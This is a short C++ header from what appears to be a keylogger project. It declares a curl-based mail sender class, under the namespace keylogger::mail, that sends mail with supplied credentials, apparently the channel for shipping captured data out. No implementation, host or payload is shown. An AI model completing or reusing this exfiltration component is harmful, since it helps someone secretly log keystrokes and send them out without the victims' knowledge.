#pragma once

#include <vector>

#include "MailSender.h"

namespace keylogger::mail
{
class CurlMailSender : public MailSender
{
public:
    bool sendMail(const Mail&, const Credentials&) override;

private:
    void constructCurrentFormattedMail(const Mail&);
    static size_t readEmailPayload(char* ptr, size_t size, size_t nmemb, void* userp);

    static std::vector<std::string> currentFormattedMail;
};
}